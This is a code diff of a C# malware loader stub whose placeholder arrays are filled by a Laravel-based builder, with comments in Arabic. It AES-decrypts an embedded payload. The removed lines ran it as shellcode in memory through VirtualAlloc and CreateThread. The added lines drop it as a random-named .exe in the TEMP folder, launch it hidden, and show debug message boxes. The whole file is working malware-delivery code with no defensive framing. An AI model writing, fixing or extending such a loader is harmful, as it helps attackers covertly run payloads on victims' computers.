@@ -2,34 +2,24 @@ using System;
 using System.IO;
 using System.Security.Cryptography;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 class Program
 {
-    // سيتم استبدال هذه البيانات من Laravel
     static byte[] encryptedData = new byte[] { __ENCRYPTED_DATA__ };
     static byte[] key = new byte[] { __AES_KEY__ };
     static byte[] iv = new byte[] { __AES_IV__ };
-
-    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
     static void Main()
     {
         try
         {
-            // 1. فك تشفير البايلود (Go Loader) في الذاكرة
+            MessageBox.Show("1. بدأ فك التشفير...");
+
             using (Aes aesAlg = Aes.Create())
             {
                 aesAlg.Key = key;
                 aesAlg.IV = iv;
-
                 ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                 
                 using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
@@ -40,29 +30,32 @@ class Program
                         {
                             csDecrypt.CopyTo(msOutput);
                             byte[] decryptedBytes = msOutput.ToArray();
-
-                            // 2. تنفيذ البايلود من الذاكرة (In-Memory Execution)
-                            // سنستخدم طريقة VirtualAlloc و CreateThread لتشغيل الكود
-                            uint PAGE_EXECUTE_READWRITE = 0x40;
-                            uint MEM_COMMIT = 0x1000;
-                            uint MEM_RESERVE = 0x2000;
-
-                            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)decryptedBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                             
-                            if (ptr == IntPtr.Zero)
-                                return;
+                            MessageBox.Show("2. تم فك التشفير. حجم البايلود: " + decryptedBytes.Length + " بايت");
 
-                            Marshal.Copy(decryptedBytes, 0, ptr, decryptedBytes.Length);
+                            // كتابة البايلود في مجلد TEMP باسم عشوائي
+                            string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
+                            File.WriteAllBytes(tempPath, decryptedBytes);
 
-                            IntPtr hThread = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
-                            WaitForSingleObject(hThread, 0xFFFFFFFF);
+                            MessageBox.Show("3. تم كتابة البايلود في: " + tempPath);
+
+                            // تشغيل البايلود
+                            ProcessStartInfo psi = new ProcessStartInfo();
+                            psi.FileName = tempPath;
+                            psi.UseShellExecute = false;
+                            psi.CreateNoWindow = true;
+                            
+                            Process.Start(psi);
+                            
+                            MessageBox.Show("4. تم تشغيل البايلود بنجاح.");
                         }
                     }
                 }
             }
         }
-        catch
+        catch (Exception ex)
         {
+            MessageBox.Show("خطأ: " + ex.Message);
         }
     }
 }
